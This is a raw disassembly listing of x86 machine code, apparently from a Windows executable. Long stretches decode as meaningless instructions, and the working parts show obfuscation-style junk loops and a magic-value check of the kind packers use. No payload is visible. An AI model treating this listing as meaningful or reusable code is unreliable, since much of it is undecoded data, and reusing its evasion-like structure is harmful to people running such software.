  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0xb6565b8
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	jle    0x409428
  409490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409491:	stos   BYTE PTR es:[edi],al
  409492:	rol    bh,cl
  409494:	cld    
  409495:	loop   0x409496
  409497:	lock or eax,0x94e605e9
  40949d:	mov    eax,ds:0xa254cf8a
  4094a3:	sbb    DWORD PTR [ecx-0x4c],0xeaf56f20
  4094aa:	pushf  
  4094ab:	popa   
  4094ac:	mov    ah,BYTE PTR [ecx]
  4094ae:	test   eax,edi
  4094b0:	xor    DWORD PTR [eax+0x66],ecx
  4094b3:	sbb    dh,BYTE PTR [ecx+0x4c]
  4094b6:	cdq    
  4094b7:	stos   DWORD PTR es:[edi],eax
  4094b8:	jo     0x40950a
  4094ba:	dec    BYTE PTR [esi]
  4094bc:	add    eax,0x56e45995
  4094c1:	retf   
  4094c2:	movlps QWORD PTR [ebx-0x34],xmm0
  4094c6:	or     ch,ch
  4094c8:	in     eax,dx
  4094c9:	outs   dx,BYTE PTR fs:[esi]
  4094cb:	jp     0x409488
  4094cd:	jno    0x409475
  4094cf:	cwde   
  4094d0:	jp     0x409534
  4094d2:	call   0x3282602a
  4094d7:	imul   esi,DWORD PTR [ebp+0x52],0xc
  4094db:	mov    ebx,0x95c9a4d1
  4094e0:	ds pop eax
  4094e2:	imul   DWORD PTR [edx+eax*2-0x28420adf]
  4094e9:	dec    esi
  4094ea:	adc    DWORD PTR [esi*4+0x76d0aeef],ebp
  4094f1:	and    al,BYTE PTR [ecx+0x64]
  4094f4:	into   
  4094f5:	cld    
  4094f6:	fisubr WORD PTR [ecx+0x7d]
  4094f9:	dec    ecx
  4094fa:	ret    0xe827
  4094fd:	mov    esi,0x7cf7d35d
  409502:	push   eax
  409503:	pop    edx
  409504:	adc    dh,BYTE PTR [ebx]
  409506:	mov    es,esp
  409508:	xchg   ebp,eax
  409509:	aaa    
  40950a:	pop    es
  40950b:	adc    ebp,DWORD PTR [ebx]
  40950d:	jb     0x40954c
  40950f:	adc    DWORD PTR [ebx],ecx
  409511:	pop    dx
  409513:	outs   dx,DWORD PTR ds:[esi]
  409514:	fsub   QWORD PTR [edi]
  409516:	cmp    ecx,ebp
  409518:	stc    
  409519:	jmp    0x1eb3:0xd79ce2bd
  409520:	mov    ecx,0x10758b72
  409525:	mov    DWORD PTR [esi+0x10],eax
  409528:	mov    eax,eax
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    bh,BYTE PTR [ecx-0x55]
  409540:	into   
  409541:	and    cl,BYTE PTR [ecx]
  409543:	and    DWORD PTR [esi+0x7e],edi
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	sbb    DWORD PTR [ebx],ebx
  40954c:	loop   0x409516
  40954e:	and    al,0x2d
  409550:	mov    esp,0x193727a6
  409555:	pop    ds
  409556:	xchg   esp,eax
  409557:	dec    edx
  409558:	ja     0x409580
  40955a:	xchg   esi,eax
  40955b:	vmulpd xmm7,xmm4,XMMWORD PTR [edi+edi*2-0x32]
  409561:	xchg   DWORD PTR [esi+0x5e376d8e],edx
  409567:	cmp    eax,0xb24d32c0
  40956c:	cpuid  
  40956e:	(bad)  
  40956f:	and    al,0xed
  409571:	mov    ds:0x5540a1c9,eax
  409576:	mov    ch,BYTE PTR [ecx+0x517baeaf]
  40957c:	xor    BYTE PTR [edi+0x6fcb0b7d],0x9d
  409583:	ins    DWORD PTR es:[edi],dx
  409584:	pushf  
  409585:	aad    0x31
  409587:	sbb    BYTE PTR [eax+0x66afeaf],dl
  40958d:	outs   dx,DWORD PTR ds:[esi]
  40958e:	fstp   QWORD PTR [ecx+0x7b]
  409591:	fisttp WORD PTR [ebp-0x26]
  409594:	jge    0x409611
  409596:	inc    edi
  409597:	sbb    cl,BYTE PTR [ecx+0x38]
  40959a:	inc    esp
  40959b:	not    BYTE PTR [edi+0x35]
  40959e:	cmp    al,ah
  4095a0:	inc    eax
  4095a1:	nop
  4095a2:	and    eax,0x2745f2f6
  4095a7:	arpl   WORD PTR [ebx],di
  4095a9:	lods   eax,DWORD PTR ds:[esi]
  4095aa:	mov    ebp,0xea3c1797
  4095af:	adc    DWORD PTR [edi+esi*4+0x17],ebx
  4095b3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b5:	push   0xd630062
  4095ba:	aam    0x16
  4095bc:	loop   0x409619
  4095be:	mov    ebx,0x48746334
  4095c3:	xor    ecx,DWORD PTR [edx]
  4095c5:	sti    
  4095c6:	sub    BYTE PTR [ecx+ecx*4+0x3e86ed6d],al
  4095cd:	lahf   
  4095ce:	in     eax,dx
  4095cf:	shr    BYTE PTR [ebp-0x70bbe714],1
  4095d5:	scas   eax,DWORD PTR es:[edi]
  4095d6:	cmp    bh,ch
  4095d8:	ds sub eax,0x7473fce3
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    esp,DWORD PTR [edx+0x7e]
  40961d:	das    
  40961e:	sahf   
  40961f:	popf   
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x409654
  409628:	mov    ecx,0x69db3630
  40962d:	and    ebx,DWORD PTR [edx+0x1a]
  409630:	inc    edx
  409631:	rcr    DWORD PTR [eax],1
  409633:	in     al,dx
  409634:	rcl    ebp,cl
  409636:	add    DWORD PTR [esi],ebx
  409638:	ret    0x65be
  40963b:	repz sbb bl,cl
  40963e:	js     0x4095df
  409640:	and    BYTE PTR [ecx+0x57f157d],dh
  409646:	sbb    ebx,DWORD PTR [ebx-0x39eb4877]
  40964c:	xor    DWORD PTR [edi+eax*8],ecx
  40964f:	add    al,0x83
  409651:	xor    eax,0x2dc33c23
  409656:	mov    cl,0xb0
  409658:	pusha  
  409659:	pop    esi
  40965a:	mov    ebx,0xda37d351
  40965f:	into   
  409660:	sub    DWORD PTR [esi],esp
  409662:	sti    
  409663:	jg     0x4096cd
  409665:	int    0xf4
  409667:	cwde   
  409668:	(bad)  [edi]
  40966a:	lea    esi,[ecx]
  40966c:	mov    al,0xc1
  40966e:	mov    al,ds:0xdcb90bb6
  409673:	shr    BYTE PTR [edi],1
  409675:	pop    ecx
  409676:	in     eax,dx
  409677:	push   ss
  409678:	or     eax,0xe37eac0a
  40967d:	pop    esp
  40967e:	dec    esi
  40967f:	mov    ah,0x3e
  409681:	xchg   DWORD PTR [edi],ebp
  409683:	mov    bh,0x4e
  409685:	sbb    eax,0x30d2fb59
  40968a:	pop    ecx
  40968b:	outs   dx,BYTE PTR ds:[esi]
  40968c:	jecxz  0x4096d4
  40968e:	add    BYTE PTR [edx+0x54],ch
  409691:	stos   BYTE PTR es:[edi],al
  409692:	inc    ecx
  409693:	or     BYTE PTR [edi-0x71c1a5dd],dh
  409699:	test   al,0x2d
  40969b:	pushf  
  40969c:	leave  
  40969d:	push   edx
  40969e:	and    al,BYTE PTR [edx]
  4096a0:	loop   0x40968b
  4096a2:	test   ebx,esi
  4096a4:	shr    DWORD PTR [ecx+0x480fe48e],cl
  4096aa:	push   ebx
  4096ab:	into   
  4096ac:	pop    edx
  4096ad:	adc    al,0xe0
  4096af:	pushf  
  4096b0:	sub    ebp,DWORD PTR [ebx-0x59]
  4096b3:	mov    ds:0x7398afa1,al
  4096b8:	inc    eax
  4096b9:	lods   al,BYTE PTR ds:[esi]
  4096ba:	and    eax,0x7a4b8875
  4096bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096c0:	leave  
  4096c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096c2:	xchg   edx,eax
  4096c3:	mov    bl,0x50
  4096c5:	addr16 cmp al,0xca
  4096c8:	add    dh,ch
  4096ca:	xlat   BYTE PTR ds:[ebx]
  4096cb:	fwait
  4096cc:	cwde   
  4096cd:	or     DWORD PTR fs:[edx-0x38aa22fc],ebx
  4096d4:	mov    WORD PTR [edx+0x71],?
  4096d7:	ds push 0xcfe5e0ae
  4096dd:	lds    ecx,FWORD PTR [ebp-0x402e3b1f]
  4096e3:	rol    BYTE PTR [ebx-0x63d1886c],1
  4096e9:	jae    0x409683
  4096eb:	mov    DWORD PTR [edi-0x39],0x55d36999
  4096f2:	(bad)
  4096f5:	push   esi
  4096f6:	and    BYTE PTR [ebp+0x33],bh
  4096f9:	sysenter 
  4096fb:	into   
  4096fc:	mov    esp,0xe25a9af9
  409701:	jbe    0x4096c3
  409703:	ret    0x713c
  409706:	outs   dx,BYTE PTR ds:[esi]
  409707:	aaa    
  409708:	dec    edi
  409709:	daa    
  40970a:	add    eax,0xe6d40552
  40970f:	push   ebx
  409710:	addr16 lahf 
  409712:	les    ecx,FWORD PTR [ecx]
  409714:	jecxz  0x4096ee
  409716:	xchg   DWORD PTR [ebp+0x2be1e849],ebp
  40971c:	pop    esi
  40971d:	bound  ebx,QWORD PTR [esi+0x6b733230]
  409723:	fucomi st,st(7)
  409725:	mov    esp,0x84654847
  40972a:	test   DWORD PTR ds:0x91fce535,esi
  409730:	ss in  eax,0xdc
  409733:	push   0xffffff8f
  409735:	dec    esp
  409736:	add    al,0x52
  409738:	stc    
  409739:	jne    0x40978f
  40973b:	add    edi,DWORD PTR [ebx+0x579f7d40]
  409741:	(bad)  
  409742:	jb     0x4096d4
  409744:	scas   al,BYTE PTR es:[edi]
  409745:	icebp  
  409746:	jge    0x4096c8
  409748:	dec    esp
  409749:	jno    0x4096cf
  40974b:	inc    esp
  40974c:	(bad)  
  40974d:	out    dx,al
  40974e:	rcl    DWORD PTR [ecx+0x1b],1
  409751:	rol    bh,1
  409753:	inc    ebp
  409754:	cld    
  409755:	cmp    al,0x85
  409757:	pushf  
  409758:	clc    
  409759:	or     DWORD PTR ds:0x4235bf,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4235db,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4235cb
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	inc    esp
  4097c0:	push   edx
  4097c1:	cmc    
  4097c2:	inc    edx
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097f4
  4097cc:	int    0xd0
  4097ce:	xchg   esi,eax
  4097cf:	lea    eax,[esi+0x6b]
  4097d2:	ins    BYTE PTR es:[edi],dx
  4097d3:	pop    ecx
  4097d4:	je     0x409766
  4097d6:	sahf   
  4097d7:	loop   0x40984c
  4097d9:	inc    esi
  4097da:	push   esp
  4097db:	rcr    esp,cl
  4097dd:	fwait
  4097de:	ret    0xfbfa
  4097e1:	hlt    
  4097e2:	sub    DWORD PTR [ecx+eiz*4-0x6],0x69
  4097e7:	dec    esi
  4097e8:	cmc    
  4097e9:	std    
  4097ea:	sar    DWORD PTR fs:[ebp+edi*1-0x26dea783],0x24
  4097f3:	push   edi
  4097f4:	mov    ecx,DWORD PTR [eax+0x79547529]
  4097fa:	xchg   edi,eax
  4097fb:	lahf   
  4097fc:	mov    edi,0x164e3e20
  409801:	call   0xda2ff3c8
  409806:	mov    esi,0xb627197f
  40980b:	in     al,0x85
  40980d:	adc    eax,0x934f18bc
  409812:	adc    esi,DWORD PTR [ebx-0xd]
  409815:	adc    eax,0xffffffba
  409818:	stos   BYTE PTR es:[edi],al
  409819:	mov    dh,0xd8
  40981b:	adc    BYTE PTR [eax+edi*2],bl
  40981e:	mov    dh,0x43
  409820:	mov    DWORD PTR [edx+0x5f],esi
  409823:	scas   al,BYTE PTR es:[edi]
  409824:	imul   ecx,esi,0x9780296c
  40982a:	outs   dx,BYTE PTR ds:[esi]
  40982b:	aad    0x84
  40982d:	not    DWORD PTR ds:0xe104d4e7
  409833:	lahf   
  409834:	jle    0x40986e
  409836:	mov    cl,0xd5
  409838:	push   0x6a
  40983a:	imul   DWORD PTR [edi-0x1e]
  40983d:	imul   eax,ebp,0xe45143bd
  409843:	inc    esi
  409844:	sub    DWORD PTR ds:0x9eb921f9,eax
  40984a:	or     esp,edx
  40984c:	pop    ds
  40984d:	push   esp
  40984e:	popa   
  40984f:	aam    0x86
  409851:	data16 outs dx,BYTE PTR ds:[esi]
  409853:	loopne 0x409803
  409855:	sbb    cl,dh
  409857:	xchg   esp,eax
  409858:	call   0x92e0:0x55deb651
  40985f:	inc    edx
  409860:	std    
  409861:	mov    ebx,0x2a21e52d
  409866:	mov    esi,0x40b1d29b
  40986b:	push   0x2e4a58ec
  409870:	inc    edx
  409871:	ins    BYTE PTR es:[edi],dx
  409872:	xor    bl,0xc5
  409875:	xchg   edx,eax
  409876:	fimul  DWORD PTR [ebp-0x3c009da1]
  40987c:	mov    gs,WORD PTR [esi-0x60d701ef]
  409882:	jne    0x4098aa
  409884:	jbe    0x40982d
  409886:	sub    ecx,DWORD PTR [ebp-0x6e]
  409889:	pop    ss
  40988a:	and    BYTE PTR [ebx+esi*8],bl
  40988d:	mov    dl,0x62
  40988f:	cdq    
  409890:	pop    esp
  409891:	rcr    ebp,1
  409893:	mov    ds:0x86329a3a,al
  409898:	adc    BYTE PTR [edx+0x41],dh
  40989b:	mov    DWORD PTR [edx-0x447c6bcd],esi
  4098a1:	push   ds
  4098a2:	add    bl,BYTE PTR [eax]
  4098a4:	add    DWORD PTR [ecx-0x1b78703b],0x8
  4098ab:	lea    ebp,[edx-0x8f4e5b0]
  4098b1:	jl     0x4098ae
  4098b3:	push   edx
  4098b4:	aad    0xfb
  4098b6:	in     eax,0x6e
  4098b8:	test   eax,0xb9ca4fc
  4098bd:	pop    edi
  4098be:	push   0x55
  4098c0:	xor    eax,0xd44d07b5
  4098c5:	xchg   DWORD PTR [ecx],edi
  4098c7:	aad    0xc6
  4098c9:	sbb    bl,BYTE PTR [ebx-0x4d]
  4098cc:	call   DWORD PTR [esi]
  4098ce:	lock mov ebx,DWORD PTR [edi+0x50]
  4098d2:	pop    edi
  4098d3:	pop    ebx
  4098d4:	sbb    eax,0x980842e5
  4098d9:	mov    al,0x5d
  4098db:	outs   dx,DWORD PTR ds:[esi]
  4098dc:	in     al,0x7e
  4098de:	inc    edi
  4098df:	iret   
  4098e0:	test   BYTE PTR ds:0xee657c99,0x4d
  4098e7:	push   edx
  4098e8:	mov    eax,0xbd66be34
  4098ed:	stos   BYTE PTR es:[edi],al
  4098ee:	cmp    al,0x63
  4098f0:	jmp    0x4098c1
  4098f2:	daa    
  4098f3:	mov    eax,DWORD PTR [ebp+0x14]
  4098f6:	and    DWORD PTR ds:0x412364,0x0
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0x6c752d4c
  409977:	jno    0x4099e6
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x4099f8
  409981:	es lock jg 0x4099a1
  409985:	xor    cl,BYTE PTR [esi]
  409987:	cmp    BYTE PTR [edi],ch
  409989:	loope  0x4099e1
  40998b:	popa   
  40998c:	mov    al,ds:0x185b9b54
  409992:	cwde   
  409993:	test   DWORD PTR [ecx-0x70],ebx
  409996:	mov    DWORD PTR [edx-0x70],esp
  409999:	sbb    ecx,DWORD PTR [edi]
  40999b:	xor    eax,edx
  40999d:	ret    
  40999e:	sbb    ebp,DWORD PTR [ebp+0x1256014d]
  4099a4:	sub    edi,DWORD PTR [edi-0x41fe5279]
  4099aa:	sbb    bh,dh
  4099ac:	add    ebp,DWORD PTR [ebx+0xa]
  4099af:	es mov edx,0xdaaf9038
  4099b5:	int3   
  4099b6:	aaa    
  4099b7:	mov    ch,0xec
  4099b9:	test   BYTE PTR [edx+edi*4-0x5c82affc],dh
  4099c0:	retf   0xd017
  4099c3:	mov    dh,0x52
  4099c5:	fwait
  4099c6:	shl    BYTE PTR [ebp-0x584c1021],0x1e
  4099cd:	push   esi
  4099ce:	inc    esi
  4099cf:	mov    ?,WORD PTR [esi]
  4099d1:	mov    eax,ds:0x71f0265e
  4099d6:	push   ebx
  4099d7:	adc    DWORD PTR [ebx-0xb449c50],edx
  4099dd:	pop    ecx
  4099de:	fst    DWORD PTR [ebx-0x2d]
  4099e1:	stos   DWORD PTR es:[edi],eax
  4099e2:	arpl   WORD PTR [eax-0x40],si
  4099e5:	xor    bl,BYTE PTR [ebx+0x6044c964]
  4099eb:	fst    QWORD PTR [edx+0x17]
  4099ee:	sbb    DWORD PTR [edx+0x2c],ecx
  4099f1:	loope  0x409a6e
  4099f3:	jle    0x409a53
  4099f5:	pop    esi
  4099f6:	add    eax,0x9da1f5e9
  4099fb:	(bad)  
  4099fc:	out    dx,eax
  4099fd:	or     DWORD PTR [edx+0x61b32efd],ecx
  409a03:	pop    es
  409a04:	pop    eax
  409a05:	jne    0x409a7e
  409a07:	in     eax,0x56
  409a09:	mov    edi,0xe5a7a44
  409a0e:	cmp    al,0x1c
  409a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a11:	inc    edi
  409a12:	stos   DWORD PTR es:[edi],eax
  409a13:	jg     0x409a45
  409a15:	dec    esi
  409a16:	adc    eax,DWORD PTR [edi-0x80]
  409a19:	daa    
  409a1a:	mov    bh,BYTE PTR [edi-0x49]
  409a1d:	test   eax,0xd5dfca8e
  409a22:	inc    ecx
  409a23:	imul   esi,DWORD PTR [eax+0x54],0x406d8e44
  409a2a:	jns    0x409a5d
  409a2c:	test   bl,cl
  409a2e:	jno    0x4099f0
  409a30:	xor    DWORD PTR ds:[ebp-0x44185b9],esi
  409a37:	pushf  
  409a38:	fs fcmovb st,st(7)
  409a3b:	xor    BYTE PTR [edx-0x3],dh
  409a3e:	inc    eax
  409a3f:	mov    esp,0x331b99c7
  409a44:	inc    edx
  409a45:	enter  0x2b6e,0x87
  409a49:	call   0x15ab2ff1
  409a4e:	mov    bl,0x67
  409a50:	mov    cl,0xb
  409a52:	push   edx
  409a53:	outs   dx,DWORD PTR ds:[esi]
  409a54:	test   eax,0x7c6f7d83
  409a59:	add    ebx,eax
  409a5b:	clc    
  409a5c:	xchg   BYTE PTR [esi],ah
  409a5e:	mov    eax,ds:0xdad7a0ff
  409a63:	imul   ecx,DWORD PTR [edx+eax*1+0x21],0xffffffce
  409a68:	sti    
  409a69:	mov    ch,BYTE PTR [ecx-0x4f69fa4b]
  409a6f:	xor    BYTE PTR [ebp-0x6e586e28],al
  409a75:	retf   
  409a76:	mov    bl,BYTE PTR [ebx-0x4ec10ce7]
  409a7c:	adc    ecx,esp
  409a7e:	mov    edi,0x5e948757
  409a83:	mov    ds:0x42bddfaf,al
  409a88:	or     DWORD PTR [eax+0x21],esi
  409a8b:	inc    edi
  409a8c:	icebp  
  409a8d:	jo     0x409a85
  409a8f:	popa   
  409a90:	push   DWORD PTR [ecx-0x5bc096c4]
  409a96:	xchg   esi,eax
  409a97:	stos   BYTE PTR es:[edi],al
  409a98:	lods   al,BYTE PTR ds:[esi]
  409a99:	xchg   ebp,eax
  409a9a:	jp     0x409a45
  409a9c:	clc    
  409a9d:	in     eax,dx
  409a9e:	cwde   
  409a9f:	nop
  409aa0:	xor    DWORD PTR [esi+0x6afc5373],0x42895717
  409aaa:	or     BYTE PTR [ebx+0x558b1c45],cl
  409ab0:	adc    BYTE PTR [ecx+0x458b0c42],cl
  409ab6:	and    BYTE PTR [ebx+0x42891055],cl
  409abc:	adc    BYTE PTR [ebx+0x14458bc0],cl
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4235c7
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4235d3,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4235d3,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4235c3
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4235d3,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4235c3,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4235bf
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
